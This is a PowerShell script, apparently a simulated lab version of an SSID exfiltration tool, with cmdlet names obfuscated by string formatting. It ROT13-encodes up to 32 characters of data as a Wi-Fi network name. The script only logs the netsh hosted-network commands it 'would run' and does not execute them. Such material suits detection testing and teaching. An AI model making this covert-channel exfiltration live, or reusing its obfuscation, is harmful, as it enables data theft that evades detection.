Function Invoke-SSIDExfil {
    [CmdletBinding()]
    Param(
        [switch]$ExfilOnly , 
        [switch]$Decode , 
        [String]$StringToExfiltrate , 
        [String]$StringToDecode 
    )

    Function ConvertTo-ROT13 {
        Param([String]$InputString )

        $builder = & ("{1}{2}{0}" -f 't' , 'New-O' , 'BJEC') System.Text.StringBuilder
        ForEach ($char In $InputString.tochararray()) {
            $code = [int][Char]$char 
            Switch ($code ) {
                {
                    $_ -ge 65 -And $_ -le 90 }
                {
                    [Void]$builder.append([Char]((($_ - 65 + 13) % 26) + 65))
                    Continue 
                }
                {
                    $_ -ge 97 -And $_ -le 122 }
                {
                    [Void]$builder.append([Char]((($_ - 97 + 13) % 26) + 97))
                    Continue 
                }
                default {
                    [Void]$builder.append($char )
                }
            }
        }

        Return $builder.ToString()
    }

    $artifactDir = & ("{2}{0}{1}" -f 'IN-pat' , 'H' , 'Jo') $PSScriptRoot "artifacts\ssid-exfil"
    If ( -Not ( & ("{0}{2}{1}" -f 'tEs' , '-PATh' , 't') $artifactDir )) {
        $Null = .("{2}{0}{1}" -f '-i' , 'tem' , 'NEW') -ItemType Directory -Path $artifactDir -Force
    }

    If ($Decode ) {
        $decoded = .("{2}{0}{1}{3}" -f 'RttO' , '-RO' , 'coNvE' , 't13') -inputstring $StringToDecode 
        .("{1}{0}{3}{2}" -f 'e-OU' , 'WrIT' , 'UT' , 'tP') "[safe] Decoded value: $decoded"
        Return 
    }

    If ($ExfilOnly ) {
        $plainText = $StringToExfiltrate 
    }
    Else {
        $plainText = "LAB:alice:hello"
    }

    If ([String]::IsNullOrWhiteSpace($plainText )) {
        Throw "StringToExfiltrate cannot be empty."
    }

    If ($plainText.length -gt 32) {
        Throw "The simulated SSID payload must be 32 characters or fewer."
    }

    $ssidName = & ("{2}{1}{3}{0}{4}" -f 'ot' , 'ERT' , 'cOnV' , 'To-R' , '13') -inputstring $plainText 
    $logPath = & ("{0}{1}" -f 'JOin-P' , 'atH') $artifactDir "ssid-actions.txt"
    $commands = @(
        "[safe] Would run: netsh wlan set hostednetwork mode=allow ssid=""$ssidName"" key='HardtoGuess!@#123'" , 
        "[safe] Would run: netsh wlan start hostednetwork" , 
        "[safe] Plaintext source: $plainText" , 
        "[safe] ROT13 SSID: $ssidName"
    )

    & ("{0}{2}{3}{1}" -f 's' , 'NtEnt' , 'E' , 'T-cO') -Path $logPath -Value $commands -Encoding UTF8

    & ("{1}{2}{0}" -f 'TPUt' , 'WR' , 'iTe-Ou') "[safe] Simulated SSID exfiltration value: $ssidName"
    & ("{1}{2}{3}{0}" -f 'UTPUt' , 'WR' , 'iT' , 'e-o') "[safe] Actions logged to $logPath"
}

& ("{3}{1}{2}{0}{4}" -f 'ExFI' , 'NVokE-' , 'SsiD' , 'I' , 'l') -exfilonly -stringtoexfiltrate "LAB:alice:hello"
